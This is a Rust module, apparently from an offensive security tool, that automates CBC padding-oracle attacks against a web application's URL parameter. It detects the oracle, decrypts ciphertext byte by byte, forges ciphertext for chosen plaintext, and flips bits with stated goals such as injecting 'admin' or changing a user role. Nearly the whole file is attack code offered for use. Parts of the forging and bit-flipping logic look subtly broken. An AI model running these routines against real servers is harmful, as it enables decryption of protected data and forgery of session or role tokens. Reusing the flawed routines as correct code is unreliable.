use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn detect(url: &str, param: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Padding Oracle Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let baseline = send(&client, url, param, "AAAAAAAAAAAAAAAA", token).await?;
    let valid_pad = send(&client, url, param, "AAAAAAAAAAAAAAAAAA==", token).await?;
    let bad_pad = send(&client, url, param, "AAAAAAAAAAAAAAAAAQ==", token).await?;

    println!("  {} Baseline:     status={} size={}", "*".cyan(), baseline.0, baseline.1);
    println!("  {} Valid padding: status={} size={}", "*".cyan(), valid_pad.0, valid_pad.1);
    println!("  {} Bad padding:   status={} size={}", "*".cyan(), bad_pad.0, bad_pad.1);

    let diff_status = valid_pad.0 != bad_pad.0;
    let diff_size = (valid_pad.1 as i64 - bad_pad.1 as i64).abs() > 10;
    let diff_body = valid_pad.2 != bad_pad.2;

    if diff_status || diff_size || diff_body {
        println!("\n{} Padding oracle DETECTED! Server differentiates between valid/invalid padding.", "[!]".red().bold());
        if diff_status { println!("  {} Different HTTP status codes", "*".red()); }
        if diff_size { println!("  {} Different response sizes ({} vs {})", "*".red(), valid_pad.1, bad_pad.1); }
        if diff_body { println!("  {} Different response bodies", "*".red()); }
    } else {
        println!("\n{} No padding oracle detected — responses are identical.", "[-]".green().bold());
    }
    Ok(())
}

pub async fn decrypt(url: &str, param: &str, ciphertext: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Padding Oracle Decryption", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{} Ciphertext: {}", "[*]".cyan().bold(), ciphertext);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let ct_bytes = base64_decode(ciphertext);

    if ct_bytes.len() < 32 {
        println!("{} Ciphertext too short — need at least 2 blocks (32 bytes).", "[-]".red().bold());
        return Ok(());
    }

    let block_size = 16;
    let num_blocks = ct_bytes.len() / block_size;
    println!("  {} Ciphertext: {} bytes, {} blocks", "*".cyan(), ct_bytes.len(), num_blocks);

    let mut decrypted = Vec::new();
    for block_idx in (1..num_blocks).rev() {
        let prev_block_start = (block_idx - 1) * block_size;
        let target_block_start = block_idx * block_size;

        let mut intermediate = [0u8; 16];
        let mut block_plain = [0u8; 16];

        for pad_val in 1..=16 {
            let byte_pos = 16 - pad_val;
            let mut found = false;

            for guess in 0..=255 {
                let mut test_ct = vec![0u8; block_size * 2];
                test_ct[..block_size].copy_from_slice(&ct_bytes[prev_block_start..prev_block_start + block_size]);
                test_ct[target_block_start - prev_block_start..].copy_from_slice(&ct_bytes[target_block_start..target_block_start + block_size]);

                test_ct[byte_pos] = guess ^ intermediate[byte_pos];
                for k in (byte_pos + 1)..16 {
                    test_ct[k] = intermediate[k] ^ pad_val as u8;
                }

                let test_b64 = base64_encode(&test_ct);
                let resp = send(&client, url, param, &test_b64, token).await?;

                if resp.0 == 200 || (resp.0 != 500 && resp.0 != 400) {
                    intermediate[byte_pos] = guess ^ pad_val as u8;
                    block_plain[byte_pos] = intermediate[byte_pos] ^ ct_bytes[prev_block_start + byte_pos];
                    found = true;
                    break;
                }
            }

            if !found {
                println!("  {} Block {} byte {} — no valid padding found", "*".red(), block_idx, byte_pos);
                break;
            }
        }

        let block_str = String::from_utf8_lossy(&block_plain).to_string();
        println!("  {} Block {} decrypted: {:?}", "*".cyan(), block_idx, block_str);
        decrypted = block_plain.to_vec().into_iter().chain(decrypted).collect();
    }

    let padding = decrypted[decrypted.len() - 1] as usize;
    if padding > 0 && padding <= 16 && decrypted.len() >= padding {
        decrypted.truncate(decrypted.len() - padding);
    }

    let result = String::from_utf8_lossy(&decrypted).to_string();
    println!("\n{} Decrypted plaintext: {}", "[+]".green().bold(), result);
    Ok(())
}

pub async fn encrypt(url: &str, param: &str, plaintext: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Padding Oracle Encryption (Bit-Flipping)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{} Plaintext: {}", "[*]".cyan().bold(), plaintext);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let pt_bytes = plaintext.as_bytes();
    let block_size = 16;
    let padding_needed = block_size - (pt_bytes.len() % block_size);
    let mut padded = pt_bytes.to_vec();
    padded.extend(vec![padding_needed as u8; padding_needed]);

    let num_blocks = padded.len() / block_size;
    println!("  {} Plaintext: {} bytes, {} blocks (padded)", "*".cyan(), padded.len(), num_blocks + 1);

    let mut crafted_ct = vec![0u8; (num_blocks + 1) * block_size];
    let random_iv: Vec<u8> = (0..block_size).map(|_| rand::random()).collect();
    crafted_ct[..block_size].copy_from_slice(&random_iv);

    for block_idx in (0..num_blocks).rev() {
        let target_block = &padded[block_idx * block_size..(block_idx + 1) * block_size];
        let mut intermediate = [0u8; 16];

        for pad_val in 1..=16 {
            let byte_pos = 16 - pad_val;
            for guess in 0..=255 {
                let mut test_ct = vec![0u8; block_size * 2];
                test_ct[..block_size].copy_from_slice(&crafted_ct[block_idx * block_size..(block_idx + 1) * block_size]);
                test_ct[block_size..].copy_from_slice(&[0u8; 16]);

                test_ct[byte_pos] = guess;
                for k in (byte_pos + 1)..16 {
                    test_ct[k] = intermediate[k] ^ pad_val as u8;
                }

                let test_b64 = base64_encode(&test_ct);
                let resp = send(&client, url, param, &test_b64, token).await?;

                if resp.0 == 200 {
                    intermediate[byte_pos] = guess ^ pad_val as u8;
                    break;
                }
            }
        }

        for i in 0..16 {
            crafted_ct[(block_idx + 1) * block_size + i] = intermediate[i] ^ target_block[i];
        }
    }

    let result_b64 = base64_encode(&crafted_ct);
    println!("\n{} Crafted ciphertext: {}", "[+]".green().bold(), result_b64);
    println!("{} Submit this as the {} parameter to get the server to decrypt to your plaintext.", "[*]".cyan().bold(), param);
    Ok(())
}

pub async fn bit(url: &str, param: &str, ciphertext: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} CBC Bit-Flipping Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{} Ciphertext: {}", "[*]".cyan().bold(), ciphertext);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let ct_bytes = base64_decode(ciphertext);

    if ct_bytes.len() < 32 {
        println!("{} Ciphertext too short.", "[-]".red().bold());
        return Ok(());
    }

    let block_size = 16;
    let num_blocks = ct_bytes.len() / block_size;
    println!("  {} {} blocks of {} bytes", "*".cyan(), num_blocks, block_size);

    let targets = [
        ("Flip first byte of block 1", 0, 0x01),
        ("Flip to inject 'admin'", 0, 0x00),
        ("Flip to change user role", 5, 0x01),
        ("Flip to modify ID", 3, 0xFF),
    ];

    for (name, byte_pos, xor_val) in &targets {
        let mut modified = ct_bytes.clone();
        modified[*byte_pos] ^= xor_val;
        let modified_b64 = base64_encode(&modified);
        let resp = send(&client, url, param, &modified_b64, token).await?;
        let changed = resp.1 > 0;
        let tag = if changed { format!("status={} size={}", resp.0, resp.1) } else { format!("status={}", resp.0) };
        println!("  {} {:35} {}", "*".cyan(), name, tag);
    }

    println!("\n{} Bit-flipping modifies the previous block's plaintext by XORing the ciphertext.", "[*]".cyan().bold());
    Ok(())
}

async fn send(client: &Client, url: &str, param: &str, value: &str, token: Option<&str>) -> anyhow::Result<(u16, usize, String)> {
    let target = if url.contains('?') { format!("{}&{}={}", url, param, url_encode(value)) } else { format!("{}?{}={}", url, param, url_encode(value)) };
    let mut req = client.get(&target);
    if let Some(t) = token { req = req.header("Authorization", format!("Bearer {}", t)); }
    let resp = req.send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();
    Ok((status, body.len(), body))
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
            result.push(c);
        } else {
            for b in c.to_string().bytes() { result.push_str(&format!("%{:02X}", b)); }
        }
    }
    result
}

fn base64_encode(data: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose};
    general_purpose::STANDARD.encode(data)
}

fn base64_decode(s: &str) -> Vec<u8> {
    use base64::{Engine, engine::general_purpose};
    general_purpose::STANDARD.decode(s).unwrap_or_default()
}
